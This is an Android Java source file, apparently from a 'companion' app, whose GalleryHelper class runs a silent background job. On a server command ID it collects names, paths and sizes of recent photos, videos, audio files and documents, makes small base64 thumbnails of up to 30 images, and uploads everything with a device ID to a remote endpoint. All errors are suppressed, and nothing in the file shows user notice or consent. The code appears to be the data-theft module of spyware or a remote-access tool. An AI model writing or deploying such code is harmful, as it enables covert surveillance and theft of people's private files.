package com.snapapp.companion;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import org.json.JSONArray;
import org.json.JSONObject;

public class GalleryHelper {

    public static void syncGallery(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONArray allFiles = new JSONArray();
                    scanCategory(context, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image", allFiles, 150);
                    scanCategory(context, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video", allFiles, 50);
                    scanCategory(context, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", allFiles, 50);
                    scanDocuments(context, allFiles, 50);

                    if (allFiles.length() > 0) {
                        JSONObject body = new JSONObject();
                        body.put("device_id", deviceId);
                        if (cmdId != null) body.put("command_id", cmdId);
                        body.put("files", allFiles);
                        ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                    }
                } catch (Exception ignored) {}
            }
        }).start();
    }

    @SuppressLint("Range")
    private static void scanCategory(Context ctx, Uri uri, String type, JSONArray target, int limit) {
        try {
            ContentResolver cr = ctx.getContentResolver();
            String[] proj = new String[]{
                    MediaStore.MediaColumns.DISPLAY_NAME,
                    MediaStore.MediaColumns.SIZE,
                    MediaStore.MediaColumns.DATA,
                    MediaStore.MediaColumns.DATE_MODIFIED
            };
            Cursor c = cr.query(uri, proj, null, null, MediaStore.MediaColumns.DATE_MODIFIED + " DESC LIMIT " + limit);
            if (c == null) return;

            while (c.moveToNext()) {
                String name = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
                long size = c.getLong(c.getColumnIndex(MediaStore.MediaColumns.SIZE));
                String path = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DATA));

                JSONObject f = new JSONObject();
                f.put("file_name", name != null ? name : (type + "_" + System.currentTimeMillis()));
                f.put("file_path", path != null ? path : "");
                f.put("file_type", type);
                f.put("file_size_bytes", size);

                if ("image".equals(type) && path != null && target.length() < 30) {
                    try {
                        android.graphics.BitmapFactory.Options o = new android.graphics.BitmapFactory.Options();
                        o.inSampleSize = 8;
                        android.graphics.Bitmap b = android.graphics.BitmapFactory.decodeFile(path, o);
                        if (b != null) {
                            android.graphics.Bitmap s = android.graphics.Bitmap.createScaledBitmap(b, 96, 96, false);
                            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
                            s.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
                            f.put("thumbnail_path", "data:image/jpeg;base64," + android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP));
                            if (s != b) b.recycle();
                            s.recycle();
                        }
                    } catch (Throwable ignored) {}
                }
                target.put(f);
            }
            c.close();
        } catch (Exception ignored) {}
    }

    @SuppressLint("Range")
    private static void scanDocuments(Context ctx, JSONArray target, int limit) {
        try {
            ContentResolver cr = ctx.getContentResolver();
            Uri uri = MediaStore.Files.getContentUri("external");
            String[] proj = new String[]{
                    MediaStore.MediaColumns.DISPLAY_NAME,
                    MediaStore.MediaColumns.SIZE,
                    MediaStore.MediaColumns.DATA,
                    MediaStore.MediaColumns.MIME_TYPE
            };
            String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE ? OR " +
                    MediaStore.MediaColumns.MIME_TYPE + " LIKE ? OR " +
                    MediaStore.MediaColumns.MIME_TYPE + " LIKE ?";
            String[] args = new String[]{"application/pdf%", "application/msword%", "text/%"};

            Cursor c = cr.query(uri, proj, sel, args, MediaStore.MediaColumns.DATE_MODIFIED + " DESC LIMIT " + limit);
            if (c == null) return;

            while (c.moveToNext()) {
                String name = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
                long size = c.getLong(c.getColumnIndex(MediaStore.MediaColumns.SIZE));
                String path = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DATA));

                JSONObject f = new JSONObject();
                f.put("file_name", name != null ? name : "Document");
                f.put("file_path", path != null ? path : "");
                f.put("file_type", "document");
                f.put("file_size_bytes", size);
                target.put(f);
            }
            c.close();
        } catch (Exception ignored) {}
    }
}
